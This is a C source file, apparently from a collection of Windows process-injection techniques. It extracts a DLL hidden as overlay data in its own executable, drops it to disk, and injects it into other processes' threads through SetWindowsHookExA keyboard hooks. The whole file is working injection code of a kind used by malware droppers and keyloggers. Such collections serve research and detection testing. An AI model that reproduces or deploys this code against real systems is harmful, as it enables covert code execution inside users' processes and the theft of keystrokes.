#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h> 
#include "..\..\Shared\payload.c"
#include "..\..\Shared\overlay.c"
#include "..\..\Shared\findThreads.c"

typedef void* HANDLE;

HHOOK hHooks[MAXIMUM_WAIT_OBJECTS];

int setWindowsHookExDllInjection(){
    //get overlay data
    struct Overlay overlay;
    overlay.overlayData = NULL;
    overlay.overlaySize = 0;
    getOverlay(&overlay);
    if(overlay.overlayData == NULL || overlay.overlaySize == 0){
        perror("Injection failed. Could not get overlay data.\n");
        exit(EXIT_FAILURE);
    }

    //write file from overlay on disk
    struct Payload payload;
    payload.payloadSize = overlay.overlaySize;
    payload.payloadData = overlay.overlayData;
    char *dllPath = (char *)dropPayloadOnDisk("setWindowsHookExDllInjection.dll", payload);
    if (dllPath == 0){
        perror("Injection failed. DLL could not be created.\n");
        exit(EXIT_FAILURE);
    }

    HANDLE hDll = LoadLibraryA(dllPath);
    if (hDll == NULL){
        perror("DLL injection failed. Dll could not be loaded.\n");
        exit(EXIT_FAILURE);
    }

    LPVOID addressOfExport = GetProcAddress(hDll, "hookExport");
    if (addressOfExport == NULL){
        perror("DLL injection failed. Address of export function could not be resolved.\n");
        exit(EXIT_FAILURE);
    }

    //get count of 32 bit threads and their TID store in global array threadIDsArray
    struct TIDs tids;
    tids.maxItemsCount = sizeof(hHooks);
    getRemoteThreadTIDs(&tids);
    if (tids.itemsCount == 0){
        perror("DLL injection failed. Could not get remote thread TIDs.\n");
        exit(EXIT_FAILURE);
    }

    //creates hooks for keyboard event
    for (int i = 0; i < tids.itemsCount; i++){
        hHooks[i] = SetWindowsHookExA(WH_KEYBOARD, (HOOKPROC)addressOfExport, (HINSTANCE)hDll, tids.threadsPidsArray[i]);
    }
 
    //to unhook function after succsefull hook
    //hook function creates Mutex
    while(1){
        Sleep(10);
        HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, "HookMutex"); 
        if(hMutex != NULL){
            break;
        }
    }

    //release hooks
    for (int i = 0; i < tids.itemsCount; i++){
        UnhookWindowsHookEx(hHooks[i]);
    }
    puts("Injection successfull.");
}

int main(int argc, char *argv[]){
    setWindowsHookExDllInjection();
    return 0;
}
